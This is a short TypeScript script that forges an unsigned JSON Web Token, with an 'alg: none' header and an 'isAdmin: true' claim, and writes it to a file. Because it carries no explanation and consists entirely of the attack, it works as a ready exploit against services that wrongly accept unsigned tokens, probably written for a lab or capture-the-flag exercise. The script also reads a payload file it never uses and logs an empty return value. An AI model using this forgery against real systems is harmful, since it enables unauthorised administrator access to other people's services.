import fs from 'fs';
import { fileURLToPath } from 'url';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const input_payload:string = fs.readFileSync("payload.txt","utf-8");

function base64(input:unknown):string|undefined{
    try {
        const buffer = Buffer.from(JSON.stringify(input))
        .toString("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
        return buffer;
    } catch (error) {
        console.error(error);
    }
};



const head:{alg:'none',typ:'JWT'}={
    alg:'none',
    typ:'JWT',
};

const payload={
    isAdmin:true,
};


const get_token = ():void=>{
    try {
        const encode_head = base64(head);
        const encode_payload = base64(payload);
        const token = `${encode_head}.${encode_payload}.`;
        fs.writeFileSync('output_forge_token.txt',token);
    } catch (error) {
        console.error(error);
    }
};

console.log(get_token())